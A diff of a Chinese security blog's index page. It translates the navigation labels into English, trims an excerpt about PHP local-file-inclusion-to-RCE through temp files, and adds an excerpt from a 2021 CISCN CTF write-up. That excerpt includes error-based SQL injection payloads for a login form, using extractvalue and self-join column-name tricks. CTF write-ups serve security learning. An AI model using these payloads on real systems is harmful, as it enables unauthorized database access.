@@ -55,7 +55,7 @@
           
           
           <li class="nav-item">
-            <a class="nav-link" href="/">首页</a>
+            <a class="nav-link" href="/">Home</a>
           </li>
         
           
@@ -63,7 +63,7 @@
           
           
           <li class="nav-item">
-            <a class="nav-link" href="/archives/">归档</a>
+            <a class="nav-link" href="/archives/">Archives</a>
           </li>
         
           
@@ -71,7 +71,7 @@
           
           
           <li class="nav-item">
-            <a class="nav-link" href="/categories/">分类</a>
+            <a class="nav-link" href="/categories/">Categories</a>
           </li>
         
           
@@ -79,7 +79,7 @@
           
           
           <li class="nav-item">
-            <a class="nav-link" href="/tags/">标签</a>
+            <a class="nav-link" href="/tags/">Tags</a>
           </li>
         
           
@@ -87,7 +87,7 @@
           
           
           <li class="nav-item">
-            <a class="nav-link" href="/about/">关于</a>
+            <a class="nav-link" href="/about/">About</a>
           </li>
         
         
@@ -140,6 +140,56 @@
     
     
       <div class="col-12 col-md-4 m-auto">
+        <a href="/2021/05/18/easy_sql/" target="_self">
+          <img src="/img/10.jpg" srcset="/img/loading.gif" alt="第十四届全国大学生信息安全竞赛部分wp" class="img-fluid rounded z-depth-3 index-thumbnails">
+        </a>
+      </div>
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2021/05/18/easy_sql/">
+        <p class="h4 index-header">第十四届全国大学生信息安全竞赛部分wp</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">第十四届全国大学生信息安全竞赛部分wpeasy_sql进来是个登录界面，sqlmap能跑出部分信息。
+fuzz后发现过滤
+union
+information
+column
+inno无列名注入
+注列名
+payload
+uname=123&#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag as a join flag as b using(id)as c),0x7e)))#&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95得到no字段。
+注字段名
+Payload:
+uname=123&#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag as a join flag as b using(id,no))as c),0x7e)))#&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95
+再通过字段名去注flag。得到后半截。
+Payload：
+</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2021-05-18&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/WP">WP</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+      <div class="col-12 col-md-4 m-auto">
         <a href="/2021/03/20/LFI RCE总结/" target="_self">
           <img src="/img/9.jpg" srcset="/img/loading.gif" alt="LFI RCE总结" class="img-fluid rounded z-depth-3 index-thumbnails">
         </a>
@@ -151,20 +201,10 @@
         
         
           
+          
         
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">LFI RCE总结​    PHP LFI即本地文件包含漏洞，通过包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等达到拿服务器权限的目的。
-​    比较常用的方法有：PHPINFO()和 PHP7 Segment Fault。他们的基本原理都是向服务器上传生成恶意的临时文件，再对恶意文件进行包含即可RCE。
-临时文件文件名
-由于临时文件名是由随机函数生成的，我们需要获取正确的文件名，也就是$_FILES[&#39;userfile&#39;][&#39;name&#39;]。
-存储目录及命名规律
-文件被上传后，默认会被存储到服务端的默认临时目录中，该临时目录由php.ini的upload_tmp_dir属性指定，假如upload_tmp_dir的路径不可写，PHP会上传到系统默认的临时目录中。
-了解不同系统的默认存储路径很重要，因为在很多时候服务器都是按照默认设置来运行的。
-linux：
-路径 — /tmp/
-命名规则 — /tmp/php[6个随机字符]
-windows:
-路径 — C:/Windows/              C:/Windows/</div>
+        <div class="index-excerpt" style="max-height: none;">
+          <div class="index-text mb-1">LFI RCE总结​    PHP LFI即本地文件包含漏洞，通过包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等达到拿服务器权限的目的。...</div>
         </div>
       </a>
 
@@ -574,7 +614,7 @@ t：从堆栈中弹出对象，直到一</div>
   <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
     <div class="modal-content">
       <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
         <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
           <span aria-hidden="true">&times;</span>
         </button>
@@ -583,7 +623,7 @@ t：从堆栈中弹出对象，直到一</div>
         <div class="md-form mb-5">
           <input type="text" id="local-search-input" class="form-control validate">
           <label data-error="x" data-success="v"
-                 for="local-search-input">关键词</label>
+                 for="local-search-input">keyword</label>
         </div>
         <div class="list-group" id="local-search-result"></div>
       </div>
